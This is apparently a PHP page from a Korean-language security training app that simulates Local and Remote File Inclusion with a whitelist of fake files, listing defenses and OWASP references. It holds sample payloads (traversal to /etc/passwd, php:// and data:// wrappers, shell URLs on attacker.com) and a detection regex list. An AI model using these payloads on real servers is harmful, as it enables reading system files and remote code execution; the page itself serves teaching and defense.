<?php
// 출력 버퍼링 시작 (헤더 전송 문제 방지)
ob_start();

// 세션 시작 (TestPage 전에)
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../db.php';
require_once __DIR__ . '/../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

require_once 'TestPage.php';

// 1. 페이지 설정
$page_title = 'File Inclusion (LFI/RFI)';
$description = '<p><strong>File Inclusion</strong>은 웹 애플리케이션이 사용자 입력을 통해 파일을 포함시킬 때 발생하는 취약점입니다.</p>
<ul>
    <li><strong>LFI (Local File Inclusion):</strong> 서버의 로컬 파일에 접근</li>
    <li><strong>RFI (Remote File Inclusion):</strong> 외부 서버의 파일 실행</li>
</ul>
<p><strong>참고:</strong> 이 페이지에서는 실제 민감한 파일에 접근하지 않고 안전하게 시뮬레이션합니다.</p>';

// 2. 페이로드 정의
$payloads = [
    'lfi_basic' => [
        'title' => '📂 Basic Local File Inclusion (LFI)',
        'description' => '기본적인 디렉토리 순회를 통한 시스템 파일 접근 시도입니다.',
        'payloads' => [
            '../etc/passwd',
            '../../etc/passwd',
            '/etc/passwd',
            '/proc/version'
        ]
    ],
    'lfi_wrapper' => [
        'title' => '🐘 PHP Wrapper Techniques',
        'description' => 'PHP의 스트림 래퍼를 악용한 고급 LFI 기법입니다.',
        'payloads' => [
            'php://filter/read=convert.base64-encode/resource=../etc/passwd',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
        ]
    ],
    'rfi_basic' => [
        'title' => '🌐 Remote File Inclusion (RFI)',
        'description' => '외부 서버의 악성 파일을 실행시키는 매우 위험한 공격입니다.',
        'payloads' => [
            'http://attacker.com/shell.txt',
            'https://attacker.com/shell.php'
        ]
    ]
];

// 3. 방어 방법 정의
$defense_methods = [
    "<strong>화이트리스트 방식:</strong> 허용된 파일 목록만 사용",
    "<strong>입력 검증:</strong> 사용자 입력에서 위험한 문자 필터링",
    "<strong>경로 정규화:</strong> `realpath()` 등을 사용하여 경로 정규화",
    "<strong>`chroot` jail:</strong> 파일 시스템 접근 제한",
    "<strong>`allow_url_include` 비활성화:</strong> PHP 설정에서 원격 파일 포함 금지"
];

// 4. 참고 자료 정의
$references = [
    "OWASP - File Inclusion Testing" => "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
    "PortSwigger - Directory Traversal" => "https://portswigger.net/web-security/file-path-traversal"
];

// 5. 테스트 폼 UI 정의
$file_path_input = htmlspecialchars($_POST['payload'] ?? '');
$test_type = htmlspecialchars($_POST['test_type'] ?? 'lfi');

$test_form_ui = <<<HTML
<div class="info-box" style="background: #f8d7da; border-color: #f5c6cb; color: #721c24;">
    <h3>⚠️ 심각한 보안 위험</h3>
    <p>File Inclusion 취약점은 다음과 같은 심각한 결과를 초래할 수 있습니다:</p>
    <ul>
        <li>민감한 시스템 파일 노출 (/etc/passwd, /etc/shadow 등)</li>
        <li>소스 코드 및 설정 파일 노출</li>
        <li>원격 코드 실행 (RFI의 경우)</li>
        <li>전체 시스템 권한 탈취</li>
    </ul>
</div>

<form method="post" class="test-form">
    <h3>🧪 File Inclusion 테스트</h3>
    
    <div class="test-type-selector">
        <label><input type="radio" name="test_type" value="lfi" {($test_type === 'lfi' ? 'checked' : '')}> Local File Inclusion (LFI)</label>
        <label><input type="radio" name="test_type" value="rfi" {($test_type === 'rfi' ? 'checked' : '')}> Remote File Inclusion (RFI)</label>
    </div>
    
    <label for="payload">파일 경로:</label>
    <input type="text" name="payload" id="payload" placeholder="예: ../etc/passwd 또는 test.txt" value="{$file_path_input}">
    <br><br>
    <button type="submit" class="btn" style="background: #dc3545;">파일 포함 테스트</button>
</form>
HTML;

// 6. 테스트 로직 콜백 정의
$test_logic_callback = function($form_data) {
    $file_path_input = $form_data['payload'] ?? '';
    $test_type = $form_data['test_type'] ?? 'lfi';
    $result = '';
    $error = '';

    if (empty($file_path_input)) {
        $error = "파일 경로를 입력해주세요.";
        return ['result' => $result, 'error' => $error];
    }

    // 안전한 파일 목록 (시뮬레이션용)
    $safe_files = [
        'test.txt' => 'This is a test file content.',
        'sample.txt' => 'Sample file for testing purposes.',
        'info.txt' => 'Information file content.',
        'readme.txt' => 'README file content for testing.'
    ];

    // 위험한 패턴 감지
    $dangerous_patterns = [
        '/\\.\\.\\//',           // Directory traversal
        '//etc//',          // System files
        '/php:\\/\\//',         // PHP wrappers
        '/data:\\/\\//',        // Data URLs
        '/http:\\/\\//',        // Remote files
        '/https?:\\/\\//',       // Remote files
        '/%00/'              // Null byte
    ];
    
    $is_dangerous = false;
    $detected_patterns = [];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $file_path_input)) {
            $is_dangerous = true;
            $detected_patterns[] = $pattern;
        }
    }
    
    if ($is_dangerous) {
        $result = "<div class=\"error-box\">⚠️ 위험한 File Inclusion 패턴이 감지되었습니다!</div>";
        $result .= "<p>입력된 경로: <code>" . htmlspecialchars($file_path_input) . "</code></p>";
        $result .= "<p>감지된 패턴: " . htmlspecialchars(implode(', ', $detected_patterns)) . "</p>";
        $result .= "<p>이러한 패턴들은 다음과 같은 공격에 사용될 수 있습니다:</p><ul><li>Local File Inclusion (LFI): 서버의 민감한 파일 읽기</li><li>Remote File Inclusion (RFI): 외부 악성 파일 실행</li></ul>";
    } else {
        // 안전한 파일만 처리
        $clean_path = basename($file_path_input); // 경로 제거
        
        if (isset($safe_files[$clean_path])) {
            $result = "<div class=\"result-box\">✅ 안전한 파일에 접근했습니다.</div>";
            $result .= "<p>파일명: <code>" . htmlspecialchars($clean_path) . "</code></p>";
            $result .= "<pre><code>" . htmlspecialchars($safe_files[$clean_path]) . "</code></pre>";
        } else {
            $result = "<div class=\"error-box\">❌ 요청한 파일을 찾을 수 없습니다.</div>";
            $result .= "<p>사용 가능한 파일: " . htmlspecialchars(implode(', ', array_keys($safe_files))) . "</p>";
        }
    }

    return ['result' => $result, 'error' => $error];
};

// 7. TestPage 인스턴스 생성 및 실행
$test_page = new TestPage($page_title, $description, $payloads, $defense_methods, $references, "File_Inclusion_Analysis.md");
$test_page->set_test_form($test_form_ui);
$test_page->set_test_logic($test_logic_callback);
$test_page->run();

?>